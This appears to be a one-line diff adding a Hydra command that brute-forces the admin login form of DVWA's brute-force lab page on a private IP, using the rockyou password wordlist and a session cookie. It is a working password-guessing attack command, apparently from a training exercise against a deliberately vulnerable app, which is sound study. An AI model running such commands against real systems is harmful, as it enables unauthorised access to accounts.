@@ -1,0 +1,1 @@
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.5.4 http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=o2sv00uk17a3j31bj7orf93412; security=low:F=Username and/or password incorrect'
